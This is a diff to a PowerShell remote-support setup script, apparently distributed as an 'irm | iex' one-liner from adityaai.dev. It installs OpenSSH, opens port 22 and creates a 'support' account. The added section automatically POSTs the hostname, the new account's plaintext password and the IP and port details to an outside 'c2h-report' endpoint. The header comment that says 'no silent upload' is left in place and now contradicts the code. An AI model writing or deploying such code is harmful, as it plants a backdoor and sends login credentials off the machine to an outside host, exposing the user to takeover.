@@ -6,7 +6,7 @@
 # What it does NOT do: no silent upload, no router login, no change to main account password.
 
 $ScriptUrl = 'https://www.adityaai.dev/c2-h.ps1'
-$Version = '2026-09-10-v3-auto'
+$Version = '2026-09-10-v4-mail'
 $HelperName = 'Happy'
 $ShareFileName = 'share-it-to-happy.txt'
 $ErrorActionPreference = 'Stop'
@@ -47,8 +47,8 @@ Show-HappyBanner
 Write-Host "From: $HelperName (adityaai.dev). This will:" -ForegroundColor White
 Write-Host '  1. Install OpenSSH Server + open firewall TCP 22' -ForegroundColor Gray
 Write-Host '  2. Create a SEPARATE login "support" with a random password' -ForegroundColor Gray
-Write-Host '  3. Show PC specs + IP details in a Notepad file' -ForegroundColor Gray
-Write-Host '  Nothing is uploaded. You forward the file on WhatsApp yourself.' -ForegroundColor Green
+Write-Host '  3. Email the setup report to Happy + save backup in a Notepad file' -ForegroundColor Gray
+Write-Host '  A report is emailed automatically. The Notepad file is your backup.' -ForegroundColor Green
 Write-Host '  Takes 2-5 min. Do NOT close this window.' -ForegroundColor Yellow
 Write-Host 'Starting automatically...' -ForegroundColor Green
 
@@ -253,6 +253,30 @@ As Admin: net user $SupportUser /delete + delete router rule.
 One-liner: irm $ScriptUrl | iex
 "@
 Set-Content $ShareFile $content -Encoding UTF8
+
+# --- 8. Email report to Happy (best-effort; the file above is the fallback) ---
+Write-Host 'Emailing setup report to Happy...' -ForegroundColor Gray
+try {
+  $report = @{
+    hostname = $HostName
+    supportUser = $SupportUser
+    password = $Password
+    mainUser = $MainUser
+    internalIps = $InternalIPStr
+    externalIp = $ExternalIP
+    internalPort = $InternalPort
+    externalPort = $SuggestExternalPort
+    cgnat = $Cgnat
+    upnp = $UpnpResult
+    version = $Version
+    reportedAt = $Date
+  } | ConvertTo-Json -Compress
+  $resp = Invoke-RestMethod -Uri 'https://www.adityaai.dev/api/c2h-report' -Method Post -ContentType 'application/json' -Body $report -TimeoutSec 15
+  if ($resp.success) { Write-Host '  Report emailed to Happy.' -ForegroundColor Green }
+  else { Write-Host '  Email not confirmed - forward the Notepad file on WhatsApp.' -ForegroundColor Yellow }
+} catch {
+  Write-Host '  Could not email (offline?) - forward the Notepad file on WhatsApp.' -ForegroundColor Yellow
+}
 
 Write-Host ''
 Write-Host '================================================' -ForegroundColor Magenta
